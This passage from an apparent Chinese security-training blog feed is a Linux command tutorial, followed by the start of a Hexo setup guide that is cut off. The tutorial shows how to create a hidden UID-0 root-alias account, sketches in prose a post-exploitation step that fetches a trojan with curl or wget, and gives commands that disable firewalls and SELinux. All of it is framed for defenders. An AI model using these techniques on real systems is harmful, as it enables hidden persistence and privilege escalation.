Name&gt;            <span class="comment"># 类似于 find . -name &lt;File Name&gt;</span></span><br><span class="line">ag -i PATTERN                <span class="comment"># 忽略大小写搜索含PATTERN文本</span></span><br><span class="line">ag -A [number] PATTERN       <span class="comment">#搜索含PATTERN文本，并显示匹配内容之后的n行文本，例如：ag -A 5  abc会显示搜索到的包含abc的行以及它之后5行的文本信息。</span></span><br><span class="line">ag -B [number] PATTERN       <span class="comment">#搜索含PATTERN文本，并显示匹配内容之前的n行文本</span></span><br><span class="line">ag -C [number] PATTERN       <span class="comment">#搜索含PATTERN文本，并同时显示匹配内容以及它前后各n行文本的内容。</span></span><br><span class="line">ag --ignore-dir &lt;Dir Name&gt;   <span class="comment">#忽略某些文件目录进行搜索。</span></span><br><span class="line">ag -w PATTERN                <span class="comment">#全匹配搜索，只搜索与所搜内容完全匹配的文本。</span></span><br><span class="line">ag --java PATTERN            <span class="comment">#在java文件中搜索含PATTERN的文本。</span></span><br><span class="line">ag --xml PATTERN             <span class="comment">#在XML文件中搜索含PATTERN的</span></span><br></pre></td></tr></table></figure><p><img src="/img/20221102120024.png"></p><h3 id="locate"><a href="#locate" class="headerlink" title="locate"></a>locate</h3><p><code>locate *.ps</code> 寻找以 .ps 结尾的文件，需先运行 <code>updatedb</code> 命令。</p><h3 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h3><p><code>whereis xxxx</code> 显示一个二进制文件、源码或man的位置。</p><h1 id="4-vi-编辑器"><a href="#4-vi-编辑器" class="headerlink" title="4.vi 编辑器"></a>4.vi 编辑器</h1><p><strong>打开</strong></p><p><code>vi filename</code>  打开或新建文件，并将光标置于第一行首。<br><code>vi +n filename</code>  打开文件，并将光标置于第n行首。</p><p><strong>编辑</strong></p><p><code>i</code> 在当前位置生前插入<br><code>I</code> 在当前行首插入<br><code>a</code> 在当前位置后插入<br><code>A</code> 在当前行尾插入<br><code>o</code> 在当前行之后插入一行<br><code>O</code> 在当前行之前插入一行</p><p><strong>基本查找</strong></p><p><code>/text</code> 查找text，按回车执行查找，n健查找下一个，按N健查找前一个。<br><code>?text</code> 查找text，反向查找，按回车执行查找，按n健查找下一个，按N健查找前一个。<br>查找很长的词，如果一个词很长，键入麻烦，可以将光标移动到该词上，按<code>*</code>或<code>#</code>键即可以该单词进行搜索，<code>*</code>相当于<code>/</code>搜索。而<code>#</code>命令相当于<code>?</code>搜索。</p><p><strong>删除</strong></p><p><code>dd</code> 删除当前行。</p><p><code>2dd</code> 删除2行。</p><p><code>ggdG</code> 删除全文。(gg跳到行首，dG删除当前行及以下行，d为删除，G为光标跳转到末尾行)</p><p><strong>拷贝和粘贴</strong></p><p><code>yy</code> 拷贝当前行。<br><code>nyy</code> 拷贝光标后开始的n行，比如2yy拷贝当前行及其下一行。<br><code>p</code>  在当前光标后粘贴。</p><p>区块拷贝：</p><ol><li>将光标移动到要复制的文本开始的地方，按 v进入可视模式。</li><li>将光标移动到要复制的文本的结束的地方，按y复制。此时vim会自动将光标定位到选中文本的开始的地方，并退出可视模式。</li><li>我移动光标到文本结束的地方，按 p粘贴。</li></ol><p><strong>退出命令</strong></p><p><code>:wq</code> 保存并退出。<br><code>:q!</code> 强制退出并忽略所有更改。<br><code>:e!</code> 放弃所有修改，并打开原来文件。<br><code>:w</code>保存修改。</p><p><strong>显示行号</strong></p><p><code>:set number</code> 或 <code>:set nu</code> 。</p><p><code>:n</code> 跳转到第n行。</p><p><code>Shift+g</code> 跳转到最后一行。</p><p>按“$”键，跳转到当前行的最后一个字符。</p><p>按两次“g”，跳到第一行的第一个字符。</p><p>按“0”，跳转到当前行的第一个字符。</p><p><code>u</code> 撤销操作，相当于Ctrl+z。</p><p><strong>vim与vi的区别</strong></p><p>vim是vi的延申，vim编辑源码会高亮，vim的命令对vi是完全兼容的。</p><h1 id="5-用户和群组"><a href="#5-用户和群组" class="headerlink" title="5.用户和群组"></a>5.用户和群组</h1><h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><h3 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h3><p><code>useradd</code>命令用于建立用户帐号。</p><p>参数：</p><ul><li>-r：建立系统账号。</li><li>-m：自动建立用户的家目录。</li><li>-s [shell]：指定用户登入后所使用的shell。</li><li>-c [备注]：加上备注文字。备注文字会保存在passwd的备注栏位中。</li><li>-d [登入目录]：指定用户登入时的启始目录。</li><li>-g [群组]：指定用户所属的群组。</li><li>-u [uid]：指定用户id。</li><li>-o：使uid可重复。</li></ul><p>建立UID为0的用户：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd aaa -o -u 0</span><br></pre></td></tr></table></figure><p>aaa实际上还是root用户，只是root的别名用户，系统只认 uid 不认名。</p><p><img src="/img/20220901191522.png"></p><p><img src="/img/20220901202832.png"></p><p>我们在做防守方巡检的时候要检查有没有root的别名用户，防止攻击者。</p><p>uid&#x3D;0只属于root，1-499是系统用户，500以后可以分配给普通用户，一般我们新建用户默认是从1000开始的。</p><h2 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h2><h3 id="userdel"><a href="#userdel" class="headerlink" title="userdel"></a>userdel</h3><p><code>userdel 用户名</code> 删除一个用户。</p><h2 id="修改用户"><a href="#修改用户" class="headerlink" title="修改用户"></a>修改用户</h2><h3 id="usermod"><a href="#usermod" class="headerlink" title="usermod"></a>usermod</h3><p>使用<code>usermod</code>命令可以更改用户的各项信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-l&lt;帐号名称&gt;           #修改用户帐号名称。</span><br><span class="line">-c&lt;备注&gt;              #修改用户帐号的备注文字。</span><br><span class="line">-g&lt;群组&gt;              #修改用户所属的群组。</span><br><span class="line">-G&lt;群组&gt;              #修改用户所属的附加群组。</span><br><span class="line">-d&lt;登入目录&gt;           #修改用户家目录。</span><br><span class="line">-e&lt;有效期限&gt;           #修改帐号的有效期限。</span><br><span class="line">-f&lt;缓冲天数&gt;           #修改在密码过期后多少天即关闭该帐号。</span><br><span class="line">-L                    #锁定用户密码，使密码无效。</span><br><span class="line">-s&lt;shell&gt;             #修改用户登入后所使用的shell。</span><br><span class="line">-u&lt;uid&gt;               #修改用户ID。</span><br><span class="line">-U                    #解除密码锁定。</span><br></pre></td></tr></table></figure><p>如修改用户名 name1 为 name2：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usermod name1 -l name2</span><br></pre></td></tr></table></figure><p><code>usermod -a -G xxxx k1</code> 把用户k1添加到xxxx用户组，-a是保留原用户组，-G是指定要添加的用户组。</p><h2 id="创建用户组"><a href="#创建用户组" class="headerlink" title="创建用户组"></a>创建用户组</h2><h3 id="groupadd"><a href="#groupadd" class="headerlink" title="groupadd"></a>groupadd</h3><p><code>groupadd 组名</code> 创建一个新用户组。</p><h2 id="删除用户组"><a href="#删除用户组" class="headerlink" title="删除用户组"></a>删除用户组</h2><h3 id="groupdel"><a href="#groupdel" class="headerlink" title="groupdel"></a>groupdel</h3><p><code>groupdel 组名</code> 删除一个用户组。</p><h2 id="修改用户组"><a href="#修改用户组" class="headerlink" title="修改用户组"></a>修改用户组</h2><h3 id="groupmod"><a href="#groupmod" class="headerlink" title="groupmod"></a>groupmod</h3><p>参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-g, --gid GID                 #将组 ID 改为 GID</span><br><span class="line">-h, --help                    #显示此帮助信息并推出</span><br><span class="line">-n, --new-name NEW_GROUP      #改名为 NEW_GROUP</span><br><span class="line">-o, --non-unique              #允许使用重复的 GID</span><br><span class="line">-p, --password PASSWORD       #将密码更改为(加密过的) PASSWORD</span><br><span class="line">-R, --root CHROOT_DIR         #chroot 到的目录</span><br><span class="line">-P, --prefix PREFIX_DIR       #prefix directory where are located the /etc/* files</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">groupmod 原组名 -n 新组名</span><br></pre></td></tr></table></figure><p><code>sudo passwd 用户名</code> 修改用户密码。</p><p><code>id 用户名</code> 查看用户id和其组id。</p><h2 id="passwd-命令"><a href="#passwd-命令" class="headerlink" title="passwd 命令"></a>passwd 命令</h2><p><code>passwd</code>命令用于修改或添加用户的密码, 用法：<code>passwd [user]</code> </p><p>以root用户登录时，可以修改系统内任意用户的密码，且无需遵守密码复杂度要求。</p><p>以普通用户登录时，只能修改自己的密码，且必须遵守密码复杂度要求。</p><p>当<code>passwd</code>命令不跟用户名时，代表修改当前用户密码。</p><h2 id="sudo和su"><a href="#sudo和su" class="headerlink" title="sudo和su"></a>sudo和su</h2><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具。</p><p>root用户需要设置普通用户的sudo权限，设置之后，普通用户在命令前加sudo即可使用管理员权限执行改命令。</p><p>su：A 用户切换到 root 用户需要验证 root 的密码，证明自己是 root。</p><p>sudo：拥有sudo权限的用户存在 &#x2F;etc&#x2F;sudoers 文件中，假如 A 存在，B 不存在那个文件里，A要启用sudo权限，需要验证自己的密码，证明自己是A，自己有sudo权限。而不是验证root密码。</p><h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><p><code>sudo [command]</code>的形式，可以使sudo用户以root权限执行一些命令。第一次执行需要验证sudo用户的密码。</p><p>在使用<code>sudo [command]</code>时，sudo用户虽然使用了root权限执行了命令，但依然使用的是自己的环境。</p><h4 id="sudo-i"><a href="#sudo-i" class="headerlink" title="sudo -i"></a>sudo -i</h4><p><code>sudo -i</code>命令，可以使sudo用户切换为root用户。</p><p>在切换为root后，会切换到root的家目录，并使用root用户的环境。</p><p>切换root用户时会校验sudo用户的密码。</p><h4 id="sudo-s"><a href="#sudo-s" class="headerlink" title="sudo -s"></a>sudo -s</h4><p><code>sudo -s</code>命令，也可以使sudo用户切换为root用户。</p><p>切换用户后，不会切换目录，仍然使用sudo用户自己的环境。</p><p>切换root用户时需要验证sudo用户自己的密码。</p><h3 id="su"><a href="#su" class="headerlink" title="su"></a>su</h3><p><code>su [username]</code>是切换用户的命令，不写用户默认root。</p><p>它不局限于sudo用户使用，任何用户想切换到其他用户都可以使用这个命令。</p><p>切换用户时，需要验证要切换用户的密码。切换后，仍使用原来的环境变量。</p><h4 id="su-1"><a href="#su-1" class="headerlink" title="su -"></a>su -</h4><p><code>su - [username]</code>是切换用户的命令，不写用户默认root。</p><p>它不局限于sudo用户使用，任何用户想切换到其他用户都可以使用这个命令。</p><p>切换用户时，需要验证要切换用户的密码。切换后，使用新用户的环境变量。</p><h3 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit</h3><p>从其他用户切换到root用户后，可以执行exit返回原来的用户。</p><h3 id="logout"><a href="#logout" class="headerlink" title="logout"></a>logout</h3><p><code>sudo su -l root</code> 登录为root用户。</p><p>登录到其他用户的shell上时，可以执行logout登出shell。</p><h2 id="whoami-命令"><a href="#whoami-命令" class="headerlink" title="whoami 命令"></a>whoami 命令</h2><p><code>whoami</code>命令用于显示当前用户。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><h2 id="chown命令"><a href="#chown命令" class="headerlink" title="chown命令"></a>chown命令</h2><p>chown命令用于设置文件所有者。</p><p>用法：<code>chown [-R] [username]:[groupname] [filename]</code> 案例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown aaa:aaagroup 1.txt</span><br><span class="line">chown -R aaa:aaagroup bbb #-R 递归，bbb目录及其下所有目录、文件</span><br></pre></td></tr></table></figure><h1 id="6-常用网络命令"><a href="#6-常用网络命令" class="headerlink" title="6.常用网络命令"></a>6.常用网络命令</h1><p>网络和监控命令类似于这些： hostname, ping, ifconfig, iwconfig, netstat, nslookup, traceroute, finger, telnet, ethtool 用于查看 linux 服务器 ip 地址，管理服务器网络配置，通过 telnet 和 ethernet 建立与 linux 之间的网络链接，查看 linux 的服务器信息等。下面让我们看看在 Linux 下的网络和监控命令的使用。</p><p><code>ping</code>  一般用于测试网络是否通，内网<a href="https://baike.baidu.com/item/ICMP/572452?fromtitle=ICMP%E5%8D%8F%E8%AE%AE&fromid=421332&fr=aladdin">ICMP协议</a>。</p><p><code>ping www.baidu.com -c 3</code> 执行3次。</p><p><code>iwconfig</code> 用于配置或获取无线网络设备信息。</p><p><code>ip addr show</code>查看ip地址。</p><p><code>ip a</code>查看ip地址。</p><h2 id="netstat-命令"><a href="#netstat-命令" class="headerlink" title="netstat 命令"></a>netstat 命令</h2><p><code>netstat</code>命令用来打印Linux中网络系统的状态信息，可让你得知整个Linux系统的网络情况。</p><p>用法：<code>netstat [选项]</code></p><p>参数：</p><ul><li>-a或–all：显示所有连线中的Socket；</li><li>-l或–listening：显示监控中的服务器的Socket；</li><li>-n或–numeric：直接使用ip地址，而不通过域名服务器；</li><li>-t或–tcp：显示TCP传输协议的连线状况；</li><li>-p或–programs：显示正在使用Socket的程序识别码和程序名称；</li><li>-u：显示UDP传输协议的连线状况；</li><li>-l：仅列出有在 Listen (监听) 的服务状态。</li><li>-r：显示路由信息，路由表。</li><li>-o：显示进程的ID；</li><li>-e：显示扩展信息，例如uid等。</li><li>-s：按各个协议进行统计。</li><li>-c：每隔一个固定时间，执行该netstat命令。</li></ul><p>提示：LISTEN和LISTENING的状态只有用-a或者-l才能看到。</p><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -an</span><br><span class="line">netstat -anltp</span><br></pre></td></tr></table></figure><p><img src="/img/20220910203940.png"></p><p><img src="/img/20220910204005.png"></p><table><thead><tr><th>Proto</th><th>Recv-Q</th><th>Send-Q</th><th>Local Address</th><th>Foreign Address</th><th>State</th><th>PID&#x2F;Program name</th></tr></thead><tbody><tr><td>协议</td><td>网络接收队列</td><td>网路发送队列</td><td>本地地址</td><td>外部地址</td><td>端口状态</td><td>进程ID&#x2F;程序名</td></tr></tbody></table><p>协议：主要有tcp协议与udp协议， 网络协议是通信计算机双方必须共同遵从的一组约定。如怎么样建立连接、怎么样互相识别等。只有遵守这个约定，计算机之间才能相互通信交流。具体的内容，我们将会在之后的章节中介绍。</p><p>recv-Q 表示网络接收队列 表示收到的数据已经在本地接收缓冲，但是还有多少没有被进程取走。 如果接收队列Recv-Q一直处于阻塞状态，可能是遭受了拒绝服务 denial-of-service 攻击。</p><p>send-Q 表示网路发送队列</p><p>对方没有收到的数据或者说没有Ack的,还是本地缓冲区。 如果发送队列Send-Q不能很快的清零，可能是有应用向外发送数据包过快，或者是对方接收数据包不够快。</p><p>本地地址与外部地址，分别以本地IP+端口，外部IP+端口的形式表达。</p><ul><li>IP地址是IP协议提供的一种统一的地址格式，目前，你只需知道它是由4组从0到255的数字组成，以0.0.0.0至255.255.255.255的形式表达的，可以表示计算机的网络位置（地址）的地址格式。更详细的内容我们将会在后续章节中介绍。</li><li>端口(port)，可以认为是设备与外界通讯交流的出口。目前您只需理解，如果把IP地址比作一间房子，端口就是出入这间房子的门，计算机上的各类服务借由此“门”与外界通信。一个IP可以有65535（2^16^）个端口。在一个计算机上，每个服务都会启用一个端口。</li></ul><p>state（当前端口状态）有以下几种状态：</p><table><thead><tr><th>端口状态</th><th>意义</th></tr></thead><tbody><tr><td>LISTEN</td><td>侦听来自远方的TCP端口的连接请求</td></tr><tr><td>SYN-SENT</td><td>再发送连接请求后等待匹配的连接请求</td></tr><tr><td>SYN-RECEIVED</td><td>再收到和发送一个连接请求后等待对方对连接请求的确认</td></tr><tr><td>ESTABLISHED</td><td>代表一个打开的连接</td></tr><tr><td>FIN-WAIT-1</td><td>等待远程TCP连接中断请求，或先前的连接中断请求的确认</td></tr><tr><td>FIN-WAIT-2</td><td>从远程TCP等待连接中断请求</td></tr><tr><td>CLOSE-WAIT</td><td>等待从本地用户发来的连接中断请求</td></tr><tr><td>CLOSING</td><td>等待远程TCP对连接中断的确认</td></tr><tr><td>LAST-ACK</td><td>等待原来的发向远程TCP的连接中断请求的确认</td></tr><tr><td>TIME-WAIT</td><td>等待足够的时间以确保远程TCP接收到连接中断请求的确认</td></tr><tr><td>CLOSED</td><td>没有任何连接状态</td></tr></tbody></table><p>在排查网络连接的 ip 过程中，一是排查本地端口是否有意料之外的端口在运行，如果有可能是攻击者利用此端口进行shell连接；二是排查远端ip是否为境外的ip，一般攻击者为了不实名购买服务器，会买境外的服务器。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -anltp |awk <span class="string">&#x27;&#123;print($4)&#125;&#x27;</span> |<span class="built_in">sort</span> |<span class="built_in">uniq</span> |grep -v :: |grep -v Local |grep -v server |awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1)&#125;&#x27;</span> &gt;&gt; ip.txt</span><br></pre></td></tr></table></figure><p>sort 将文件&#x2F;文本的每一行作为一个单位相互比较，比较原则是从首字符向后依次按ASCII码值进行比较，最后将他们按升序输出。</p><p>uniq 相邻行的去重。</p><p>可用 geoiplookup +shell脚本 区分境外ip。</p><p>cat 1.txt|grep -v “China”</p><h2 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h2><p>查询其他记录<br>直接查询返回的是A记录，我们可以指定参数，查询其他记录，比如AAAA、MX等。</p><p><code>nslookup -qt=type domain [dns-server]</code> </p><p><code>nslookup -qt=type www.baidu.com</code> </p><p>其中，type可以是以下这些类型：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">A 地址记录</span><br><span class="line">AAAA 地址记录</span><br><span class="line">AFSDB Andrew文件系统数据库服务器记录</span><br><span class="line">ATMA ATM地址记录</span><br><span class="line">CNAME 别名记录</span><br><span class="line">HINFO 硬件配置记录，包括CPU、操作系统信息</span><br><span class="line">ISDN 域名对应的ISDN号码</span><br><span class="line">MB 存放指定邮箱的服务器</span><br><span class="line">MG 邮件组记录</span><br><span class="line">MINFO 邮件组和邮箱的信息记录</span><br><span class="line">MR 改名的邮箱记录</span><br><span class="line">MX 邮件服务器记录</span><br><span class="line">NS 名字服务器记录</span><br><span class="line">PTR 反向记录</span><br><span class="line">RP 负责人记录</span><br><span class="line">RT 路由穿透记录</span><br><span class="line">SRV TCP服务器信息记录</span><br><span class="line">TXT 域名对应的文本信息</span><br><span class="line">X25 域名对应的X.25地址记录</span><br></pre></td></tr></table></figure><p><strong>http协议</strong> </p><p><code>curl http://www.baidu.com</code> 查看网页HTML源码。</p><p><code>wget www.baidu.com</code> 下载网页到当前目录。</p><h2 id="tracert"><a href="#tracert" class="headerlink" title="tracert"></a>tracert</h2><p>路由追踪。</p><p>traceroute则是应用在linux&#x2F;BSD&#x2F;router&#x2F;UNIX下。 tracert是Windows下常用的命令行工具,UNIX下的是traceroute。</p><p>都是基于UDP协议的路由探测。</p><h2 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h2><p><code>traceroute www.baidu.com</code> 路由跟踪。</p><p>traceroute是用来检测发出数据包的主机到目标主机之间所经过的网关数量的工具。traceroute的原理是试图以最小的TTL（存活时间）发出探测包来跟踪数据包到达目标主机所经过的网关，然后监听一个来自网关ICMP的应答。发送数据包的大小默认为38个字节。</p><p>traceroute的参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-d 使用Socket层级的排错功能。</span><br><span class="line">-f 设置第一个检测数据包的存活数值TTL的大小。</span><br><span class="line">-F 设置勿离断位。</span><br><span class="line">-g 设置来源路由网关，最多可设置8个。</span><br><span class="line">-i 使用指定的网络界面送出数据包。</span><br><span class="line">-I 使用ICMP回应取代UDP资料信息。</span><br><span class="line">-m 设置检测数据包的最大存活数值TTL的大小。</span><br><span class="line">-n 直接使用IP地址而非主机名称。</span><br><span class="line">-p 设置UDP传输协议的通信端口。</span><br><span class="line">-r 忽略普通的Routing Table，直接将数据包送到远端主机上。</span><br><span class="line">-s 设置本地主机送出数据包的IP地址。</span><br><span class="line">-t 设置检测数据包的TOS数值。</span><br><span class="line">-v 详细显示指令的执行过程。</span><br><span class="line">-w 设置等待远端主机回报的时间。</span><br><span class="line">-x 开启或关闭数据包的正确性检验。</span><br></pre></td></tr></table></figure><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>Linux telnet命令用于远端登入。</p><p>它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。</p><p>要开始一个 telnet会话，必须输入用户名和密码来登录服务器。</p><p>telnet因为采用明文传送报文，安全性不好，很多Linux服务器都不开放telnet服务，而改用更安全的ssh方式了。</p><p>执行telnet指令开启终端机阶段作业，并登入远端主机。</p><p>现在多数用于检测某个端口是否开放。</p><h2 id="finger"><a href="#finger" class="headerlink" title="finger"></a>finger</h2><p>Finger是一种用户信息分享服务。它工作在 TCP 79 端口，可以用来公开用户的特定信息。</p><p>Nmap 的 finger 的脚本可以向 Finger 服务器发送请求，查询并获取用户的相关信息，如登录名、用户名、TTY类型、登录时间等。</p><h1 id="7-防火墙"><a href="#7-防火墙" class="headerlink" title="7.防火墙"></a>7.防火墙</h1><h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p><code>iptalbes -L</code> 查看防火墙规则。</p><p><code>iptables -F</code> 清除规则。</p><h2 id="firewalld"><a href="#firewalld" class="headerlink" title="firewalld"></a>firewalld</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld    <span class="comment">#只是关闭防火墙当前状态，重启之后还会被启动</span></span><br><span class="line">systemctl <span class="built_in">enable</span> firewalld  <span class="comment">#防火墙开机自启</span></span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld <span class="comment">#防火墙禁止开机自启</span></span><br></pre></td></tr></table></figure><h2 id="ufw"><a href="#ufw" class="headerlink" title="ufw"></a>ufw</h2><p>ufw管理firewalld。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">安装：apt-get install ufw</span><br><span class="line">关闭：ufw <span class="built_in">disable</span></span><br><span class="line">开启：ufw <span class="built_in">enable</span></span><br></pre></td></tr></table></figure><h1 id="8-远程连接命令"><a href="#8-远程连接命令" class="headerlink" title="8.远程连接命令"></a>8.远程连接命令</h1><h2 id="8-1-ssh命令"><a href="#8-1-ssh命令" class="headerlink" title="8.1 ssh命令"></a>8.1 ssh命令</h2><p><code>ssh</code>命令是Linux的远程连接工具。</p><p>例如<code>ssh 192.168.0.149</code>，以当前终端用户身份远程连接IP为<code>192.168.0.149</code>的计算机。</p><ul><li>-l 为指定用户 如 <code>ssh -l zhangsan 192.168.0.149</code>以farmsec用户远程登录，也可写成<code>ssh zhangsan@192.168.0.149</code></li><li>-p 为指定端口号</li></ul><p>执行<code>ssh</code>的默认情况下，会使用本地的用户名连接对方的用户名，例如本地的root连接对面服务器的root，如果两端用户名不一样，则需要使用<code>-l username</code>指定用户名。</p><p>再确认密码后，方能登录成功，而同时变化的文件为：<code>/root/.ssh/known_hosts</code> 在第一次登录时，openssh将会提示不知道这台登录的主机，只要输入<code>yes</code>，就会把这台主机的“识别信息”添加到known_hosts文件中. 第二次登陆后，则无须此步骤，但是如果出现错误，例如主机产生变化，则需要删除<code>/root/.ssh/known_hosts</code>内容。</p><h2 id="8-2-linux下远程连接smb"><a href="#8-2-linux下远程连接smb" class="headerlink" title="8.2 linux下远程连接smb"></a>8.2 linux下远程连接smb</h2><p>Smb服务为网络文件共享协议，它允许应用程序和终端用户从远端的文件服务器访问文件资源 用法：在kali的<code>文件</code>–&gt;<code>其他位置</code>–&gt;<code>连接到服务器</code>处输入：<code>smb://192.168.0.149/share</code></p><p><img src="/img/20221105121841.png"></p><h2 id="8-3-rdesktop-命令"><a href="#8-3-rdesktop-命令" class="headerlink" title="8.3 rdesktop 命令"></a>8.3 rdesktop 命令</h2><p><code>rdesktop</code>命令用于在linux下链接windows远程桌面。</p><ul><li>-f 全屏显示。</li></ul><p>用法：</p><ul><li><p><code>rdesktop 192.168.0.178</code></p></li><li><p><code>rdesktop -f 192.168.0.178</code></p></li></ul><h1 id="9-URL-相关命令"><a href="#9-URL-相关命令" class="headerlink" title="9.URL 相关命令"></a>9.URL 相关命令</h1><p>URL，既为俗称的网址&#x2F;网页链接。</p><h2 id="9-1-curl-命令"><a href="#9-1-curl-命令" class="headerlink" title="9.1 curl 命令"></a>9.1 curl 命令</h2><p><code>curl</code>命令是一个利用URL规则在命令行下工作的文件传输工具。它支持文件的上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具。作为一款强力工具，curl支持包括HTTP、HTTPS、ftp等众多协议，还支持POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。</p><p>用法：<code>curl [选项] [url]</code></p><p>参数：</p><ul><li>-i 显示头部信息</li><li>-v 显示请求全过程解析</li><li>-O 下载</li></ul><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl www.farmsec.com</span><br><span class="line">curl www.farmsec.com -i</span><br><span class="line">curl www.farmsec.com -v</span><br><span class="line">curl -O https://bootstrap.pypa.io/get-pip.py</span><br></pre></td></tr></table></figure><p><img src="/img/20221105122108.png"></p><p><img src="/img/20221105122203.png"></p><p><img src="/img/20221105122241.png"></p><p><img src="/img/20221105122301.png"></p><h2 id="9-2-wget-命令"><a href="#9-2-wget-命令" class="headerlink" title="9.2 wget 命令"></a>9.2 wget 命令</h2><p>wget命令：用来从指定的URL下载文件。wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br></pre></td></tr></table></figure><p><img src="/img/20221105122400.png"></p><p>前面我们下载下的文件名都是乱码，所以我们需要给它自定义文件名 加入-O的参数即可指定文件名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget  https://bootstrap.pypa.io/get-pip.py -O 123.py</span><br></pre></td></tr></table></figure><p><img src="/img/20221105122453.png"></p><p>如果文件比较大时，加入参数<code>-b</code>，进行后台下载，然后可使用使用<code>tail -f wget-log</code>查看进度。</p><p><img src="/img/20221105122603.png"></p><p><img src="/img/20221105122627.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-c：继续执行上次终端的任务；可以在下载中断后再次使用。</span><br></pre></td></tr></table></figure><p><img src="/img/20221105122647.png"></p><h2 id="9-3-后渗透"><a href="#9-3-后渗透" class="headerlink" title="9.3 后渗透"></a>9.3 后渗透</h2><p>假如拿到一台服务器的低权限用户（比如Nginx用户），用webshell上传木马用于提权，上传不了的时候，可以在目标服务器命令行用curl或者wget下载自己云主机上准备好的木马文件，同样达到木马上传进而提权的效果。</p><p>站在防守方的角度看，可以把curl和wget卸载，不留这些包，防范于未然，其他有可能被利用，但又用不到的包也可以同样处理。这样攻击方就面临一个套娃的状态，低权限用户需要下载安装wget，但是低权限用户又没有下载安装权限，想要下载权限必须提权，想要提权又必须安装wegt从而下载木马……当然也不是绝对防御，攻击者可能用其他方法提权，但是这样也给攻击者造成了些许麻烦。</p><h1 id="10-selinux"><a href="#10-selinux" class="headerlink" title="10.selinux"></a>10.selinux</h1><p>setenforce 0 设为宽容模式，<strong>临时关闭</strong>selinux防火墙。</p><p><strong>永久关闭</strong>使用<code>vi /etc/selinux/config</code>命令编辑selinux配置文件。将文件中的<code>SELINUX=enforcing</code>更改为<code>SELINUX=disabled</code>。</p><p><code>enforcing</code> 强制模式，违反 SELinux 规则的行为将被阻止并记录到日志中。<br><code>permissive</code> 宽容模式，违反 SELinux 规则的行为只会记录到日志中。一般为调试用。<br><code>disabled</code> 关闭 SELinux。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo搭建博客</title>
      <link href="/2024/05/10/hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/05/10/hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="1-安装node-js"><a href="#1-安装node-js" class="headerlink" title="1 安装node.js"></a>1 安装node.js</h1><p><a href="https://nodejs.cn/download/">下载 | Node.js 中文网 (nodejs.cn)</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure><p><img src="/img/image-20240628210732978.png" alt="image-20240628210732978"></p><h1 id="2-安装git"><a href="#2-安装git" class="headerlink" title="2 安装git"></a>2 安装git</h1><p><a href="https://git-scm.com/download/win">Git - 下载软件包 (git-scm.com)</a> 官网下载速度慢</p><p><a href="https://registry.npmmirror.com/binary.html?path=git-for-windows/">Mirror</a> 阿里镜像站，下载速度快</p><p>一路默认安装即可。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure><p><img src="/img/image-20240628212025632.png" alt="image-20240628212025632"></p><h1 id="3-安装hexo"><a href="#3-安装hexo" class="headerlink" title="3 安装hexo"></a>3 安装hexo</h1><p>找个空文件夹执行以下命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">hexo -v</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure><p><img src="/img/image-20240629105900242.png" alt="image-20240629105900242"></p><p><img src="/img/image-20240629105921968.png" alt="image-20240629105921968"></p><p><img src="/img/image-20240629105949089.png" 